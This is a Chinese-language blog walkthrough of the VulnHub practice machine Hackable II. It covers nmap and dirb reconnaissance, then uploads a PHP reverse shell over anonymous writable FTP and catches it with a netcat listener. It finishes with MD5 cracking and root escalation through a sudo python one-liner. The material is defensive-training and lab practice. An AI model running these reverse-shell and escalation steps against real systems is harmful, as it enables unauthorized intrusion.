-<h4><span id="文件名hackableiiova">文件名：hackableII.ova</span></h4><h4><span id="文件大小14gb">文件大小：1.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackableiiova">下载地址：</span></h4><h4><span id="md5-ee4f408ba953e626e3852cfec7acefa3">MD5: EE4F408BA953E626E3852CFEC7ACEFA3</span></h4><h4><span id="sha1-89b1fdf9fcdcc5d2fbb736318ccc77e9f25d1c06">SHA1: 89B1FDF9FCDCC5D2FBB736318CCC77E9F25D1C06</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable II和攻击机kali2021在VirtualBox下设置为仅主机模式（Vmware可能会无法获取网络），使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现开放了21，22，80端口，其中21端口可以使用anonymous身份进行登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.101，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;files目录下有一个CALL.html，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.101，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/5.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="登录ftp上传webshell">登录Ftp，上传webshell</span></h3><blockquote>
-<p>1.使用anonymous直接登录ftp，发现当前目录可写：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp open 192.168.56.101</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/7.png" alt="image-"></p>
-<p>2.则可上传webshell，这里利用kali自带的webshell简单修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php，修改ip为kali的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put php-reverse-shell.php，ftp上传webshell，要在/usr/share/webshells/php/目录下</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/9.png" alt="image-"></p>
-<p>3.kali开启监听，从靶机&#x2F;files目录下访问webshell，得到shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001，利用刚才设定的端口</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="目录搜索进行提权">目录搜索，进行提权</span></h3><blockquote>
-<p>1.可以对&#x2F;home目录进行一下搜寻，发现important.txt的文件，提示我们去运行.runme.sh，并得到用户名和md5后的密码：</p>
-<p><img src="/2022/06/13/Hackable-2/12.png" alt="image-"></p>
-<p>2.通过对密码的md5破解，其实就可以登录shrek，ssh登录后，可以查看shrek &#x2F;home目录下的文件user.txt：</p>
-<p><img src="/2022/06/13/Hackable-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/14.png" alt="image-"></p>
-<p>3.再来看看能从什么地方进行提权，发现可以直接使用python：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3.5 -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;，直接提权</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/16.png" alt="image-"></p>
-<p>4.最后在&#x2F;root目录下，发现root.txt，即flag：<br><img src="/2022/06/13/Hackable-2/17.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
